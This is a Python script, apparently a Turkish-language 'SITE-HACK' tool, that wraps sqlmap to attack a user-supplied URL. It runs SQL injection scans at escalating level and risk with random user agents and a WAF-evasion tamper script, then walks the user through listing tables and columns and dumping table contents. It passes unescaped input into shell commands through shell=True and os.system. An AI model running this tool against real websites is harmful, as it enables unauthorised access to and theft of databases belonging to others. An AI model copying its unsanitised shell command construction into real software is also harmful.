#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
from colorama import Fore, Style, init

BLUE = Fore.BLUE
GREEN = Fore.GREEN
RED = Fore.RED
CYAN = Fore.CYAN
YELLOW = Fore.YELLOW
RESET = Style.RESET_ALL

init(autoreset=True)


def print_logo():
    logo = f"""{RED}
_______  __ _________ _______               _______  _______  _       
(  ____ \/  \\__   __/(  ____ \    |\     /|(  ___  )(  ____ \| \    /\\
| (    \/\/) )  ) (   | (    \/    | )   ( || (   ) || (    \/|  \  / /
| (_____   | |  | |   | (__  _____ | (___) || (___) || |      |  (_/ / 
(_____  )  | |  | |   |  __)(_____)|  ___  ||  ___  || |      |   _ (  
      ) |  | |  | |   | (          | (   ) || (   ) || |      |  ( \ \ 
/\____) |__) (_ | |   | (____/\    | )   ( || )   ( || (____/\|  /  \ \\
\_______)\____/ )_(   (_______/    |/     \||/     \|(_______/|_/    \/

{RESET}
"""
    print(logo)


def check_sqlmap_installed():
    try:
        result = subprocess.run(["which", "sqlmap"],
                                capture_output=True, text=True)
        return result.returncode == 0
    except Exception:
        return False


def validate_url(url):
    if not url:
        return False
    url = url.replace('"', '').replace("'", "")
    if not (url.startswith('http://') or url.startswith('https://')):
        return False
    return True


def run_sqlmap_command(command, description):
    print(f"\n{CYAN}[*] {description}...")
    print(f"{YELLOW}[!] Komut: {command}")
    print(f"{BLUE}[~] Tarama başlıyor...{RESET}")

    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            universal_newlines=True,
            bufsize=1
        )

        while True:
            output = process.stdout.readline()
            if output == '' and process.poll() is not None:
                break
            if output:
                print(output.strip())

        process.wait()

        if process.returncode == 0:
            print(f"{GREEN}[+] İşlem başarıyla tamamlandı!")
            return True
        else:
            print(f"{YELLOW}[!] İşlem tamamlandı (çıkış kodu: {process.returncode})")
            return True

    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Kullanıcı tarafından durduruldu!")
        return False
    except Exception as e:
        print(f"{RED}[!] Hata oluştu: {str(e)}")
        return False


def simple_sqlmap_scan():
    print_logo()

    if not check_sqlmap_installed():
        print(f"{RED}[!] SQLMap bulunamadı!")
        print(f"{YELLOW}[!] Lütfen SQLMap'i kurun:")
        print(f"{YELLOW}[!] sudo apt-get install sqlmap")
        print(f"{YELLOW}[!] veya: git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev")
        sys.exit(1)

    print(f"{GREEN}[+] SQLMap başarıyla bulundu!")

    try:
        while True:
            target_url = input(f"\n{CYAN}[?] Taranacak URL'yi girin: ").strip()

            if validate_url(target_url):
                break
            else:
                print(f"{RED}[!] Geçersiz URL! Örnek: http://site.com/page.php?id=1")

        print(f"{GREEN}[+] Hedef: {target_url}")

        scan_options = [
            {
                "name": "Hızlı Tarama",
                "command": f'sqlmap -u "{target_url}" --batch --level 1 --risk 1'
            },
            {
                "name": "Orta Seviye Tarama",
                "command": f'sqlmap -u "{target_url}" --batch --level 3 --risk 2 --random-agent'
            },
            {
                "name": "Detaylı Tarama",
                "command": f'sqlmap -u "{target_url}" --batch --level 5 --risk 3 --random-agent --tamper=space2comment'
            }
        ]

        print(f"\n{CYAN}[?] Tarama seviyesi seçin:")
        for i, option in enumerate(scan_options, 1):
            print(f"{YELLOW}[{i}] {option['name']}")

        try:
            choice = int(input(f"\n{CYAN}[?] Seçiminiz (1-3): ").strip())
            if choice < 1 or choice > 3:
                choice = 2
        except:
            choice = 2

        selected_scan = scan_options[choice - 1]


        if run_sqlmap_command(selected_scan["command"], selected_scan["name"]):
            print(f"\n{GREEN}[+] İlk tarama tamamlandı!")


            continue_scan = input(
                f"\n{CYAN}[?] Database işlemlerine devam etmek istiyor musunuz? (e/h): ").strip().lower()

            if continue_scan == 'e':
                database_name = input(f"{CYAN}[?] Database adını girin: ").strip()

                if database_name:

                    db_tables_cmd = f'sqlmap -u "{target_url}" --batch -D {database_name} --tables'
                    if run_sqlmap_command(db_tables_cmd, f"'{database_name}' database tabloları"):

                        table_name = input(f"{CYAN}[?] Tablo adını girin: ").strip()
                        if table_name:

                            table_columns_cmd = f'sqlmap -u "{target_url}" --batch -D {database_name} -T {table_name} --columns'
                            if run_sqlmap_command(table_columns_cmd, f"'{table_name}' tablo kolonları"):


                                dump_data = input(f"{CYAN}[?] Verileri çekmek istiyor musunuz? (e/h): ").strip().lower()
                                if dump_data == 'e':
                                    dump_cmd = f'sqlmap -u "{target_url}" --batch -D {database_name} -T {table_name} --dump'
                                    run_sqlmap_command(dump_cmd, f"'{table_name}' tablosundan veri çekme")

        print(f"\n{GREEN}[+] Tüm işlemler tamamlandı!")
        print(f"{CYAN}[*] Not: Daha detaylı tarama için manuel sqlmap kullanabilirsiniz.")

    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Program kullanıcı tarafından durduruldu!")
    except Exception as e:
        print(f"{RED}[!] Beklenmeyen hata: {str(e)}")


#
def direct_sqlmap_scan():

    print_logo()

    target_url = input(f"\n{CYAN}[?] Taranacak URL'yi girin: ").strip()

    if not validate_url(target_url):
        print(f"{RED}[!] Geçersiz URL formatı!")
        return

    sqlmap_command = f'sqlmap -u "{target_url}" --batch --level 3 --risk 2'

    print(f"{GREEN}[+] SQLMap başlatılıyor...")
    print(f"{YELLOW}[!] Komut: {sqlmap_command}")
    print(f"{CYAN}[*] Çıkmak için Ctrl+C tuşlarına basın{RESET}\n")

    try:

        os.system(sqlmap_command)
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Tarama durduruldu!")


if __name__ == "__main__":
    print(f"{CYAN}[?] Çalıştırma modunu seçin:")
    print(f"{YELLOW}[1] Basit mod (direk çalıştır - tavsiye edilen)")
    print(f"{YELLOW}[2] Gelişmiş mod (interaktif)")

    try:
        mode = input(f"\n{CYAN}[?] Seçiminiz (1/2): ").strip()
        if mode == "1":
            direct_sqlmap_scan()
        else:
            simple_sqlmap_scan()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Program sonlandırıldı!")